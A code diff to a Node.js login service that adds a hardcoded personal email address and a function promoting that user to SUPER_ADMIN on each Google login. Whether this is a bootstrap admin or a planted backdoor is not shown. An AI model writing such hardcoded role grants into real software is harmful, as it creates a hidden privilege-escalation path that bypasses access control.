@@ -7,6 +7,16 @@ const { signToken } = require('./tokenService');
 const authConfig = require('../config/auth');
 
 const googleClient = new OAuth2Client();
+const ADMIN_EMAILS = new Set(['yeabsiraayele42@gmail.com']);
+
+const ensureAdminAccess = async (user) => {
+  if (!user || !user.email) return;
+  const normalizedEmail = String(user.email).trim().toLowerCase();
+  if (!ADMIN_EMAILS.has(normalizedEmail) || user.role === 'SUPER_ADMIN') return;
+
+  user.role = 'SUPER_ADMIN';
+  await user.save();
+};
 
 const assertCanLogin = (user) => {
   if (user.status === 'suspended') {
@@ -85,6 +95,7 @@ const loginWithGoogle = async (credential) => {
     }
   }
 
+  await ensureAdminAccess(user);
   assertCanLogin(user);
   return buildAuthResponse(user);
 };
